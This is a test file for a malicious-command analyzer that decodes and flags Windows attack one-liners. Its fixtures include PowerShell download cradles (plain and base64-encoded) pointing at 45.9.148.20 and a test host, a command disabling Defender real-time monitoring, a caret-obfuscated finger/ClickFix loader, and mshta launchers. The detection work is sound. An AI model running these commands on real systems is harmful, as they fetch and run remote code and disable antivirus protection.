import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('analyze() sees the launcher/wrapper prefix (not just the -Command body)', () => {
  it('conhost --headless powershell -c <cradle> fires clickfix + the conhost LOLBin', async () => {
    const r = await analyze('conhost --headless powershell -nop -c iex(irm http://x.test/a)')
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('clickfix')
    expect(ids).toContain('lolbin')
  })

  it('a launcher prefix with a LOCAL (non-download) payload still yields signals', async () => {
    const r = await analyze('conhost --headless powershell -w hidden -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true"')
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('lolbin')          // conhost
    expect(ids).toContain('defender-tamper')
  })

  it('an -enc one-liner still decodes AND its inner payload signals fire through analyze()', async () => {
    // -enc payload decodes to: IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const r = await analyze('powershell -nop -w hidden -enc ' + enc)
    expect(r.signals.map((s) => s.id)).toContain('download-cradle')
  })
})

describe('nested interpreter re-entry (§2.1)', () => {
  it('cmd /c powershell -w hidden -enc <b64> decodes the inner blob and matches the top-level PS result', async () => {
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const wrapped = await analyze('cmd /c powershell -w hidden -enc ' + enc)
    const topLevel = await analyze('powershell -w hidden -enc ' + enc)
    expect(wrapped.signals.map((s) => s.id).sort()).toEqual(topLevel.signals.map((s) => s.id).sort())
    expect(wrapped.iocs.map((i) => i.raw).sort()).toEqual(topLevel.iocs.map((i) => i.raw).sort())
    expect(wrapped.layers.some((l) => l.transform.includes('cmd→powershell'))).toBe(true)
  })

  it('a pathological wrapper-in-wrapper terminates at the depth cap instead of spinning', async () => {
    const deep = 'cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c whoami'
    const r = await analyze(deep)
    const cmdHops = r.layers.filter((l) => l.transform.includes('cmd→cmd'))
    expect(cmdHops.length).toBe(4) // NESTED_REENTRY_MAX_DEPTH
    expect(r.layers[r.layers.length - 1].text).toContain('cmd /c') // did NOT fully unwrap — the cap stopped it
  })

  // Whole-branch review F1 (CRITICAL): detectInterpreter is anchored to the
  // start of the string, and reenterNestedInterpreter bailed the moment the
  // anchored check returned 'unknown' — so a nested launcher that isn't the
  // literal first token of the extracted body was missed entirely (empty
  // layers/iocs). These three shapes were verified failing before the
  // non-anchored fallback fix: the mshta Run() launcher-inside-a-quoted-arg
  // shape (spec §2.1), and two realistic cmd loader shapes (a preceding
  // command, and a preceding `start /min`).
  const ENC = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA=' // -> IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
  const NESTED_SHAPES: [string, string][] = [
    ['mshta launcher buried inside a quoted Run() arg', `mshta vbscript:CreateObject("WScript.Shell").Run("powershell -w hidden -enc ${ENC}")`],
    ['cmd: a preceding command before the launcher', `cmd /c whoami & powershell -w hidden -enc ${ENC}`],
    ['cmd: a preceding `start /min` before the launcher', `cmd /c start /min powershell -nop -w hidden -enc ${ENC}`],
  ]

  it.each(NESTED_SHAPES)('%s: still finds the nested launcher and decodes through to the inner IOC', async (_label, input) => {
    const r = await analyze(input)
    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
    expect(r.layers.some((l) => l.transform.includes('→'))).toBe(true)
  })
})

describe('evasion flags are deduped (whole-branch review F2)', () => {
  it('cmd /c powershell -w hidden -enc <b64> reports -enc and -w exactly once each, not twice', async () => {
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const r = await analyze('cmd /c powershell -w hidden -enc ' + enc)
    const flagNames = r.flags.map((f) => f.flag)
    expect(flagNames.filter((f) => f === '-enc').length).toBe(1)
    expect(flagNames.filter((f) => f === '-w').length).toBe(1)
  })
})

describe('WSH numeric char-code decode (§4)', () => {
  it('a Chr()-encoded mshta payload gets a decode layer and its own signals; a PS script with literal Chr() text is untouched', async () => {
    const mshta = await analyze('mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))')
    expect(mshta.layers.some((l) => l.transform.includes('fromCharCode') || l.transform.includes('Chr'))).toBe(true)
    const ps = await analyze("Write-Host 'Chr(72)&Chr(105)'")
    expect(ps.layers.some((l) => l.transform.includes('Chr'))).toBe(false)
  })
})

describe('closes the live-test gap (spec §0)', () => {
  const CLICKFIX_LIVE_TEST_FIXTURE =
    "cmd.exe /c for /f %e in ('f^inger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue"

  it('the caret-obfuscated finger/for-f ClickFix sample now yields cmd-cradle + finger signals, the widened ClickFix signal, and no cmd.exe-as-domain IOC', async () => {
    const r = await analyze(CLICKFIX_LIVE_TEST_FIXTURE)
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('cmd-cradle')
    expect(ids).toContain('lolbin') // the finger LOLBin, data-driven via matchLolbin
    expect(ids).toContain('clickfix')
    expect(r.iocs.map((i) => i.raw)).not.toContain('cmd.exe')
  })
})

describe('determinism across every new interpreter path', () => {
  const fixtures = [
    'cmd /c for /f %e in (\'finger user@45.9.148.20\') do %e',
    'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
    'wscript //E:vbscript C:\\Users\\Public\\payload.vbs',
    'cscript //E:jscript C:\\Users\\Public\\payload.js',
  ]

  it.each(fixtures)('same input -> identical AnalysisResult (minus checkedAt) for %s', async (input) => {
    const a = await analyze(input)
    const b = await analyze(input)
    const strip = (r: Awaited<ReturnType<typeof analyze>>) => ({ ...r, checkedAt: '' })
    expect(strip(a)).toEqual(strip(b))
  })
})
